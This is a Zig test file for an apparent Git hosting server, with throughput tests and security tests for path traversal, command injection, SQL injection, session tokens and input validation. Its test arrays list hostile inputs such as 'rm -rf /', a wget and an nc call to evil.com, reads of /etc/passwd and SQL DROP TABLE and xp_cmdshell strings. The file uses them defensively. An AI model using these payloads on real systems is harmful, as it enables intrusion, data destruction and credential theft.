const std = @import("std");
const testing = std.testing;
const main_module = @import("main.zig");
const git = @import("git.zig");
const auth = @import("auth.zig");
const db = @import("database.zig");

// ============================================================================
// PERFORMANCE AND SECURITY TESTS
// ============================================================================

test "Performance - HTTP parsing throughput" {
    const allocator = testing.allocator;
    const num_requests = 10000;
    
    const sample_request = "GET /api/repos HTTP/1.1\r\nHost: localhost:8080\r\nUser-Agent: test\r\n\r\n";
    
    const start_time = std.time.microTimestamp();
    
    for (0..num_requests) |_| {
        const method = main_module.parseMethod(sample_request);
        const path = main_module.parsePath(sample_request);
        
        // Verify parsing worked
        try testing.expectEqualStrings("GET", method.?);
        try testing.expectEqualStrings("/api/repos", path.?);
    }
    
    const end_time = std.time.microTimestamp();
    const duration_us = end_time - start_time;
    const requests_per_second = (@as(f64, num_requests) / @as(f64, @floatFromInt(duration_us))) * 1_000_000;
    
    std.debug.print("HTTP parsing: {} requests/second\n", .{@as(u64, @intFromFloat(requests_per_second))});
    
    // Should be able to parse at least 100k requests per second
    try testing.expect(requests_per_second > 100_000);
}

test "Performance - JSON parsing throughput" {
    const allocator = testing.allocator;
    const num_parses = 5000;
    
    const sample_json = "{\"name\":\"test-repo\",\"description\":\"A test repository\",\"private\":false}";
    
    const start_time = std.time.microTimestamp();
    
    for (0..num_parses) |_| {
        const name = try main_module.parseJsonString(sample_json, "name", allocator);
        defer allocator.free(name.?);
        
        try testing.expectEqualStrings("test-repo", name.?);
    }
    
    const end_time = std.time.microTimestamp();
    const duration_us = end_time - start_time;
    const parses_per_second = (@as(f64, num_parses) / @as(f64, @floatFromInt(duration_us))) * 1_000_000;
    
    std.debug.print("JSON parsing: {} parses/second\n", .{@as(u64, @intFromFloat(parses_per_second))});
    
    // Should be able to parse at least 50k JSON objects per second
    try testing.expect(parses_per_second > 50_000);
}

test "Performance - database operations throughput" {
    try db.init();
    defer db.deinit();
    
    const allocator = testing.allocator;
    const num_operations = 1000;
    
    // Clean up any existing test data
    _ = db.execSQL("DELETE FROM issues WHERE repo_name = 'perf-test'");
    
    const start_time = std.time.microTimestamp();
    
    // Test bulk insert performance
    for (0..num_operations) |i| {
        const title = try std.fmt.allocPrint(allocator, "Perf Test Issue {}", .{i});
        defer allocator.free(title);
        
        _ = try db.createIssue("perf-test", title, "Performance test issue body", allocator);
    }
    
    const end_time = std.time.microTimestamp();
    const duration_us = end_time - start_time;
    const ops_per_second = (@as(f64, num_operations) / @as(f64, @floatFromInt(duration_us))) * 1_000_000;
    
    std.debug.print("Database inserts: {} ops/second\n", .{@as(u64, @intFromFloat(ops_per_second))});
    
    // Should be able to insert at least 1000 records per second
    try testing.expect(ops_per_second > 1000);
    
    // Test query performance
    const query_start = std.time.microTimestamp();
    
    for (0..num_operations / 10) |_| {
        const issues = try db.listIssues("perf-test", allocator);
        defer {
            for (issues) |issue| {
                allocator.free(issue.repo_name);
                allocator.free(issue.title);
                allocator.free(issue.body);
                allocator.free(issue.state);
            }
            allocator.free(issues);
        }
        
        try testing.expect(issues.len == num_operations);
    }
    
    const query_end = std.time.microTimestamp();
    const query_duration_us = query_end - query_start;
    const queries_per_second = (@as(f64, num_operations / 10) / @as(f64, @floatFromInt(query_duration_us))) * 1_000_000;
    
    std.debug.print("Database queries: {} ops/second\n", .{@as(u64, @intFromFloat(queries_per_second))});
    
    // Clean up
    _ = db.execSQL("DELETE FROM issues WHERE repo_name = 'perf-test'");
}

test "Security - path traversal prevention" {
    const malicious_paths = [_][]const u8{
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "/etc/passwd",
        "C:\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd", // URL encoded
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd", // Double encoded
        "\\..\\..\\..",
        "../",
        "../../",
        "../../../../../../../../../../../etc/passwd",
    };

    for (malicious_paths) |path| {
        // Test that path parsing doesn't enable traversal
        const request = try std.fmt.allocPrint(testing.allocator, "GET {s} HTTP/1.1\r\n\r\n", .{path});
        defer testing.allocator.free(request);
        
        const parsed_path = main_module.parsePath(request);
        if (parsed_path != null) {
            // If path is accepted, verify it doesn't contain traversal sequences
            try testing.expect(std.mem.indexOf(u8, parsed_path.?, "..") == null or 
                              std.mem.indexOf(u8, parsed_path.?, "\\..") == null);
        }
    }
}

test "Security - command injection prevention in Git operations" {
    const allocator = testing.allocator;
    
    git.init();
    defer git.deinit();
    
    const malicious_repo_names = [_][]const u8{
        "test; rm -rf /",
        "test && wget evil.com/script.sh",
        "test | cat /etc/passwd",
        "test\x00; evil command",
        "test`whoami`",
        "test$(whoami)",
        "test; shutdown -h now",
        "test & ping evil.com",
        "repo|nc evil.com 1337",
        "test''; cat /etc/passwd #",
    };

    for (malicious_repo_names) |repo_name| {
        // Try to create repository with malicious name
        const repo_path = try std.fmt.allocPrint(allocator, "test-repos/{s}", .{repo_name});
        defer allocator.free(repo_path);
        
        // Should either fail cleanly or create safely
        const result = git.createRepository(repo_path, allocator);
        
        if (result) {
            // If creation succeeded, verify no command injection occurred
            // by checking that only expected files exist
            std.debug.print("Created repo with suspicious name: {s}\n", .{repo_name});
        } else |err| {
            // Expected to fail for malicious names
            _ = err;
        }
    }
}

test "Security - SQL injection prevention comprehensive" {
    try db.init();
    defer db.deinit();
    
    const allocator = testing.allocator;
    
    const sql_injection_attempts = [_][]const u8{
        "'; DROP TABLE issues; --",
        "' OR '1'='1",
        "'; INSERT INTO issues VALUES (999, 'hacked', 'pwned', 'pwned', 'open', 0, 0); --",
        "' UNION SELECT * FROM issues --",
        "'; UPDATE issues SET state='closed'; --",
        "\' OR 1=1 --",
        "admin'--",
        "admin'/*",
        "' or 1=1#",
        "' or 1=1--",
        "' or 1=1/*",
        "') or '1'='1--",
        "') or ('1'='1--",
        "1' and '1'='1",
        "1' and '1'='2",
        "' AND (SELECT COUNT(*) FROM issues) > 0 --",
        "'; EXEC xp_cmdshell('dir'); --", // SQL Server specific
        "'; SELECT load_file('/etc/passwd'); --", // MySQL specific
    };

    for (sql_injection_attempts) |malicious_input| {
        // Try to create issue with SQL injection in each field
        const issue_id = try db.createIssue("test-repo", malicious_input, "body", allocator);
        
        // Verify the malicious input was stored as literal text, not executed
        const issue = try db.getIssue(issue_id, allocator);
        defer {
            allocator.free(issue.repo_name);
            allocator.free(issue.title);
            allocator.free(issue.body);
            allocator.free(issue.state);
        }
        
        // The malicious SQL should be stored as literal text
        try testing.expectEqualStrings(malicious_input, issue.title);
        try testing.expectEqualStrings("open", issue.state); // Should still be default state
        
        // Try with body field
        const issue_id2 = try db.createIssue("test-repo", "title", malicious_input, allocator);
        const issue2 = try db.getIssue(issue_id2, allocator);
        defer {
            allocator.free(issue2.repo_name);
            allocator.free(issue2.title);
            allocator.free(issue2.body);
            allocator.free(issue2.state);
        }
        
        try testing.expectEqualStrings(malicious_input, issue2.body);
    }
}

test "Security - session token security" {
    auth.init();
    defer auth.deinit();

    // Test session token entropy and unpredictability
    var tokens = std.ArrayList([]const u8).init(testing.allocator);
    defer tokens.deinit();

    const num_tokens = 100;
    for (0..num_tokens) |_| {
        const result = try auth.authenticate("admin", "password123");
        try testing.expect(result == .ok);
        
        const session = result.ok;
        try tokens.append(session.token);
        
        // Test token characteristics
        try testing.expect(session.token.len >= 16); // Minimum length
        try testing.expect(session.token.len <= 256); // Maximum reasonable length
        
        // Token should not contain obvious patterns
        try testing.expect(std.mem.indexOf(u8, session.token, "admin") == null);
        try testing.expect(std.mem.indexOf(u8, session.token, "password") == null);
        try testing.expect(std.mem.indexOf(u8, session.token, "123") == null);
        
        // Token should not be predictable (no repeated characters throughout)
        var repeated_chars: u8 = 0;
        var last_char: u8 = 0;
        for (session.token) |c| {
            if (c == last_char) {
                repeated_chars += 1;
            } else {
                repeated_chars = 0;
            }
            try testing.expect(repeated_chars < 5); // No more than 4 consecutive same chars
            last_char = c;
        }
    }
    
    // Verify all tokens are unique
    for (tokens.items, 0..) |token1, i| {
        for (tokens.items[i+1..]) |token2| {
            try testing.expect(!std.mem.eql(u8, token1, token2));
        }
    }
}

test "Security - input validation comprehensive" {
    const allocator = testing.allocator;
    
    // Test various input validation scenarios
    const boundary_test_cases = [_]struct { 
        input: []const u8, 
        should_pass: bool,
        description: []const u8,
    }{
        .{ .input = "", .should_pass = false, .description = "empty input" },
        .{ .input = "a", .should_pass = true, .description = "single character" },
        .{ .input = "valid-repo-name", .should_pass = true, .description = "normal repo name" },
        .{ .input = "a" ** 1000, .should_pass = false, .description = "extremely long input" },
        .{ .input = "test\x00null", .should_pass = false, .description = "null byte injection" },
        .{ .input = "test\nnewline", .should_pass = false, .description = "newline injection" },
        .{ .input = "test\r\ncarriage", .should_pass = false, .description = "CRLF injection" },
        .{ .input = "test\ttab", .should_pass = false, .description = "tab character" },
        .{ .input = "test space", .should_pass = false, .description = "space in name" },
        .{ .input = "test@symbol", .should_pass = false, .description = "special characters" },
        .{ .input = "test#hash", .should_pass = false, .description = "hash character" },
        .{ .input = "test$dollar", .should_pass = false, .description = "dollar sign" },
        .{ .input = "test%percent", .should_pass = false, .description = "percent encoding" },
        .{ .input = "test&ampersand", .should_pass = false, .description = "ampersand" },
        .{ .input = "test*asterisk", .should_pass = false, .description = "asterisk wildcard" },
        .{ .input = "test?question", .should_pass = false, .description = "question mark" },
        .{ .input = "test[bracket", .should_pass = false, .description = "bracket" },
        .{ .input = "test|pipe", .should_pass = false, .description = "pipe character" },
        .{ .input = "test<less", .should_pass = false, .description = "less than" },
        .{ .input = "test>greater", .should_pass = false, .description = "greater than" },
        .{ .input = "test\"quote", .should_pass = false, .description = "double quote" },
        .{ .input = "test'apostrophe", .should_pass = false, .description = "apostrophe" },
        .{ .input = "test\\backslash", .should_pass = false, .description = "backslash" },
        .{ .input = "test/slash", .should_pass = false, .description = "forward slash" },
        .{ .input = "test:colon", .should_pass = false, .description = "colon" },
        .{ .input = "test;semicolon", .should_pass = false, .description = "semicolon" },
    };
    
    for (boundary_test_cases) |test_case| {
        // Test JSON parsing validation
        const json = try std.fmt.allocPrint(allocator, "{{\"name\":\"{s}\"}}", .{test_case.input});
        defer allocator.free(json);
        
        const result = main_module.parseJsonString(json, "name", allocator);
        
        if (result) |value| {
            if (value) |v| {
                defer allocator.free(v);
                
                if (!test_case.should_pass) {
                    std.debug.print("WARNING: Potentially unsafe input passed validation: {s} ({})\n", 
                        .{test_case.input, test_case.description});
                }
                
                // Even if input is accepted, verify it's stored safely
                try testing.expectEqualStrings(test_case.input, v);
            }
        } else |err| {
            if (test_case.should_pass) {
                std.debug.print("Valid input rejected: {s} ({}): {}\n", 
                    .{test_case.input, test_case.description, err});
            }
        }
    }
}

test "Performance - memory usage under load" {
    const allocator = testing.allocator;
    
    // Test memory usage patterns under various loads
    var arena = std.heap.ArenaAllocator.init(allocator);
    defer arena.deinit();
    
    const test_allocator = arena.allocator();
    
    // Simulate high request volume
    const num_requests = 10000;
    for (0..num_requests) |i| {
        const request = try std.fmt.allocPrint(test_allocator, 
            "POST /api/repos HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{{\"name\":\"repo-{}\"}}", .{i});
        
        const repo_name = try main_module.parseRepoNameFromBody(request, test_allocator);
        
        const expected_name = try std.fmt.allocPrint(test_allocator, "repo-{}", .{i});
        try testing.expectEqualStrings(expected_name, repo_name);
    }
    
    // Arena will clean up all allocations, testing for memory leaks
}

test "Security - rate limiting simulation" {
    auth.init();
    defer auth.deinit();
    
    // Simulate rapid authentication attempts (brute force)
    const attempts_per_second = 1000;
    const duration_seconds = 1;
    
    var successful_attempts: u32 = 0;
    var failed_attempts: u32 = 0;
    
    const start_time = std.time.milliTimestamp();
    var last_time = start_time;
    
    for (0..attempts_per_second * duration_seconds) |i| {
        // Mix of valid and invalid attempts
        const username = if (i % 10 == 0) "admin" else "attacker";
        const password = if (i % 10 == 0) "password123" else "wrong";
        
        const result = try auth.authenticate(username, password);
        if (result == .ok) {
            successful_attempts += 1;
        } else {
            failed_attempts += 1;
        }
        
        // Simulate time-based rate limiting check
        const current_time = std.time.milliTimestamp();
        if (current_time - last_time > 100) { // Every 100ms
            // In a real system, this would implement rate limiting
            last_time = current_time;
        }
    }
    
    const end_time = std.time.milliTimestamp();
    const actual_duration = end_time - start_time;
    
    std.debug.print("Auth attempts: {} successful, {} failed in {}ms\n", 
        .{ successful_attempts, failed_attempts, actual_duration });
    
    // Should have rejected most brute force attempts
    try testing.expect(failed_attempts > successful_attempts * 5);
}